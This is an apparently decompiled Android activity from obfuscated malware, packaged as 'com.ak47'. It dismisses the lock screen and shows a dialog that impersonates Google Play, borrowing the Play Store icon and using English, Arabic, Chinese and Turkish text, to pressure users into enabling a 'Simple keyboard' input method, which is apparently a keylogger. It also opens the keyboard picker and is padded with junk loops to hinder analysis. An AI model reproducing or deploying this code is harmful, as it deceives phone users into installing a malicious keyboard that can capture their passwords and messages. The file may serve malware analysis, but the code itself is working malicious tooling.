package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.KeyguardManager;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.ContextThemeWrapper;
import android.view.inputmethod.InputMethodManager;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
import java.util.Locale;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29kb extends Activity {

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29kb$a */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0105a implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0105a() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
            itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29kb.this.startActivityForResult(new Intent("android.settings.INPUT_METHOD_SETTINGS").addFlags(268435456).addFlags(32768), 2000);
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f318n = Boolean.TRUE;
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29kb$b */
    /* loaded from: classes.dex */
    class RunnableC0106b implements Runnable {
        RunnableC0106b() {
        }

        @Override // java.lang.Runnable
        public void run() {
            ((InputMethodManager) itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29kb.this.getSystemService("input_method")).showInputMethodPicker();
        }
    }

    /* renamed from: a */
    private void m98a() {
        char c;
        String str;
        String language = Locale.getDefault().getLanguage();
        AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(this, (int) C0116R.style.AlertDialogCustom));
        int hashCode = language.hashCode();
        if (hashCode == 3121) {
            if (language.equals("ar")) {
                c = 1;
            }
            c = 65535;
        } else if (hashCode == 3179) {
            if (language.equals("cn")) {
                c = 2;
            }
            c = 65535;
        } else if (hashCode != 3241) {
            if (hashCode == 3710 && language.equals("tr")) {
                c = 3;
            }
            c = 65535;
        } else {
            if (language.equals("en")) {
                c = 0;
            }
            c = 65535;
        }
        if (c == 0) {
            builder.setMessage("Enable Simple keyboard , for better performance");
            str = "Enable";
        } else if (c == 1) {
            builder.setMessage("تفعيل Simple keyboard للحصول على أداء أفضل");
            str = "تفعيل";
        } else if (c == 2) {
            builder.setMessage("启用 Simple keyboard，以获得更好的性能");
            str = "使能够";
        } else if (c != 3) {
            builder.setMessage("Enable Simple keyboard , for better performance");
            str = "OK";
        } else {
            builder.setMessage("Daha iyi performans için Simple keyboard'i etkinleştirin");
            str = "Tamam";
        }
        try {
            try {
                builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon("com.android.vending"));
                builder.setTitle("Google Play");
            } catch (PackageManager.NameNotFoundException unused) {
                builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon(getPackageName()));
                builder.setTitle(getString(C0116R.string.subscriberf62));
            }
        } catch (PackageManager.NameNotFoundException unused2) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        builder.setPositiveButton(str, new DialogInterface$OnClickListenerC0105a());
        builder.show();
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 2000 && i2 == -1) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f318n = Boolean.FALSE;
            finish();
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        try {
            try {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        getWindow().addFlags(1024);
                        ((KeyguardManager) getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard(this, null);
                        setShowWhenLocked(true);
                    } else {
                        getWindow().setFlags(1024, 6816768);
                    }
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
                getWindow().setFlags(1024, 6816768);
            }
        } catch (Exception unused3) {
            getWindow().setFlags(1024, 1024);
        }
        try {
            String stringExtra = getIntent().getStringExtra("key");
            if (stringExtra.equals("AKP")) {
                m98a();
            } else if (stringExtra.equals("AKA")) {
                new Handler().postDelayed(new RunnableC0106b(), 500L);
            } else {
                finish();
            }
        } catch (Exception unused4) {
            Boolean bool2 = Boolean.TRUE;
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
        }
    }
}
